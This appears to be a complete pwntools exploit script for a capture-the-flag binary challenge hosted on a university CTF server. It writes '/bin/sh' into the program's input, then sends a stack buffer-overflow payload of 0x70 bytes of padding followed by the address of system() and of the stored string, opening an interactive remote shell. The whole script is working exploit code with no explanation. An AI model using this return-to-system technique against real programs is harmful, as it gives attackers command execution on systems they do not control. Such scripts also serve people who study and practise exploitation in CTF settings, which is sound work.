from pwn import *
context.terminal=['gnome-terminal','-x','sh','-c']

p=process('./pwn')
p=remote('ctf.nefu.edu.cn',32768)
elf=ELF('./pwn')
if args.G:
	gdb.attach(p)
	pause()


system=elf.plt['system']
s_addr=elf.sym['s']



p.recvuntil('want')
p.sendline(b'/bin/sh')

sleep(0.5)
p.recvuntil('\n')
payload=b'a'*0x70+p32(system)+b'aaaa'+p32(s_addr)
p.sendline(payload)
p.interactive()

